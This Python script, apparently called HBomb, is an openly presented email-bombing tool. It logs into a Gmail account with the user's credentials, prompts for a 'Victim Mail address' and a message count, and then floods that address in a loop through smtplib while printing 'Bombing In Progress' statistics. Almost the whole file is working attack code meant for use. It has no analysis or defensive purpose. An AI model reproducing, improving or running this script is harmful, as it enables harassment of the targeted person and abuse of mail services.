#!/usr/bin/env python
from datetime import datetime
import os
import hashlib
import sys
import time
import threading
import string
import random
import base64
import urllib.request
import urllib.parse
import subprocess
import webbrowser
import smtplib
import sys
import os
import subprocess

Red = '\033[1;31m'
Blue= '\033[1;36m'
Endc = '\033[0m'
verl = open(".version", 'r').read()



def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def banner():
    
    clr()
    logo="""
 ██░ ██  ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   
▓██░ ██▒▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ 
▒██▀▀██░▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██
░▓█ ░██ ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  
░▓█▒░██▓░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓
 ▒ ░░▒░▒░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒
 ▒ ░▒░ ░▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░ 
 ░  ░░ ░ ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░ 
 ░  ░  ░ ░          ░ ░         ░    ░      
              ░                           ░
               ""","""
----------------   ----------------------
| KLS  Project |   | Version : """,verl,""" |
----------------   ----------------------
\tCreated by Honey Pots...
-------------------------------------------- 
"""
    print(Red+logo[0]+Blue+logo[1]+logo[2]+logo[3])


def mail():
    print(Red+ "\t\tMail Bombing \n" +Blue)
    SG0 = input("Enter your gmail address : " )
    SG = SG0.strip()
    while "@gmail.com" != SG[-10:] :
        SG = input("\aInvalid!!! Mail Please Enter your mail Again  : ")
    while int(len(SG)) < 10 : 
        SG= input("\aInvalid!!! Mail Please Enter your mail Again  : ")
    Er = input("\n\nPlease check your \"Less secure app access turn off\" \n\n\tOtherwise it give you error \n\nVisit : https://myaccount.google.com/lesssecureapps : ")
    pws = input("\nEnter your gmail password : ")
    RG = str(input("Enter Victim Mail address : "))
    num = input("Enter Number of Mail : ")
    while num == '':
        num = input("Please Enter Number of Mail : ")

    while num.isdigit() != True:
        num = input("\aInvalid! Please Enter Number of Mail : ")

    mail = int(num) + 1
    print("\n\t\t Please Wait Bombing Start...")
    while True:
        try:
            connection = smtplib.SMTP('smtp.gmail.com', 587)
            connection.ehlo()
            connection.starttls()
            connection.login(SG , pws)
            break
        except smtplib.SMTPAuthenticationError :
            print("Your Username/password not correct please Enter Again ")
            SG0 = input("Enter your gmail address : " )
            SG = SG0.strip()
            while "@gmail.com" != SG[-10:] :
                SG = input("\aInvalid!!! Mail Please Enter your mail Again  : ")
            while int(len(SG)) < 10 : 
                SG= input("\aInvalid!!! Mail Please Enter your mail Again  : ")
            pws = input("\nEnter your gmail password : ")
            print("\n\t\t Please Wait Bombing Start...")
            continue
        except smtplib.SMTPServerDisconnected :
            print("Server Disconnected !!! Please check your Internet")
            SG0 = input("Enter your gmail address : " )
            SG = SG0.strip()
            while "@gmail.com" != SG[-10:] :
                SG = input("\aInvalid!!! Mail Please Enter your mail Again  : ")
            while int(len(SG)) < 10 : 
                SG= input("\aInvalid!!! Mail Please Enter your mail Again  : ")
            pws = input("\nEnter your gmail password : ")
            print("\n\t\t Please Wait Bombing Start...")
            continue
        except :
            print("Unexpected Error !!! Please Try Again")
            SG0 = input("\n Please Enter Again your gmail address : " )
            SG = SG0.strip()
            while "@gmail.com" != SG[-10:] :
                SG = input("\aInvalid!!! Mail Please Enter your mail Again  : ")
            while int(len(SG)) < 10 : 
                SG= input("\aInvalid!!! Mail Please Enter your mail Again  : ")
            pws = input("\nPlease Enter Again Enter your gmail password : ")
            print("\n\t\t Please Wait Bombing Start...")
            continue            
        pass


    while True:
        try:
          for a in range(1, int(mail)) :
            connection.sendmail(SG, RG, "Subject:shopping \n\n .... ")
            clr()
            banner()
            print(Blue)
            print("-------------------------------------------- ")
            print(Red +"                  Details "+Blue)
            print(" Target Mail             : ",RG)
            print(" Number of Requests Sent : ",num)
            print(" Successful Requests     : ",int(a))
            print(" Failed Requests         : ",0)
            print("-------------------------------------------- ")
            print("            Bombing In Progress")
          clr()
          banner() 
          print(str(num) + " Mail Send Successful To  " + str(RG))
          input("\n\nPress Enter To Run Again HBomb Tool : ")  
          subprocess.call([sys.executable, 'HBomb.py']) 

        except smtplib.SMTPServerDisconnected :
            print("Unexpected Error !!! Please Try Again")
            RG = str(input("Enter Victim Mail address : "))
            print("\n\t\t Please Wait Bombing Start...")
            continue 
        except :
            print("Victim mail not correct !!!")
            RG = str(input("Enter Victim Mail address : "))
            print("\n\t\t Please Wait Bombing Start...")
            continue         
        pass
clr()
banner()
try:
    urllib.request.urlopen('https://www.google.com')
except Exception:
    print("   You are not connected To Internet!!!")
    print("\n  Please Connect To Internet To Continue...\n")
    input('   Press Enter To Use Again Mail Bombing ...')
    subprocess.call([sys.executable, 'ml.py'])
mail()
